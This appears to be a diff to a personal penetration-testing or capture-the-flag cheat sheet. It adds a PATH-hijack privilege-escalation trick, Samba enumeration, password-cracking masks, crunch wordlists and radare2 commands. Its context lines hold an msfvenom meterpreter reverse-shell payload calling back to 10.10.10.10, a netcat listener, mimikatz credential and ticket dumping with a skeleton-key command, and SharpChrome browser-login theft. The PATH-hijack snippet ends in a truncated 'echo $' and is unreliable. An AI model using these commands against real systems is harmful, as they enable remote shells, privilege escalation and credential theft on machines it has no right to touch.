@@ -36,6 +36,7 @@ nc -nvlp 1337
 # HASHCAT (hashcat)
 Crack bcrypt hashes:
 hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt 
+
 # MSFVENOM (msfvenom, msf, metasploit)
 Generate reverse shell exe (bash):
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1338 -f exe -o /home/kali/rev.exe
@@ -108,6 +109,11 @@ find / -perm +6000 2> /dev/null
 Check sudo apps you can run:
 sudo -l
 
+Hijack path:
+which tar
+echo "/bin/bash" > tar
+echo $
+
 Read root files with error messages (unstable):
 command_you_can_run --var-in-there="/root/flag.txt"
 
@@ -120,6 +126,11 @@ Proc:
 /proc/net/tcp
 /proc/sched_debug
 /proc/pid/cmdline
+
+# SAMBA (samba)
+enum4linux host
+searchsploit samba
+smbmap -H 10.10.10.3
 
 # MINIMODEM
 Ascii to WAV:
@@ -384,6 +395,11 @@ token:elevate
 lsadump::sam
 
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT thomas.hash
+john --incremental:Lower --incremental:Alpha --incremental:Digits (10 char) --incremental:Alnum
+john --mask=?1?1?1?1?1?1?1?1 -1=[A-Z]
+wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/doc/MASK
+
+crunch 1 6 abcdefg
 
 Export ticket:
 sekurlsa::tickets /export
@@ -414,6 +430,15 @@ misc::skeleton
 # LOOTING (loot, chrome)
 https://github.com/djhohnstein/SharpChromium
 SharpChrome.exe logins /showall
+
+# RADARE2 (r2, radare)
+aaa (analyze)
+afl (analyze functions)
+pd (print)
+pd1 (print 1)
+pdf @main (print function)
+s entry0
+VV @main (visalize function)
 
 # XSS (xss)
 html
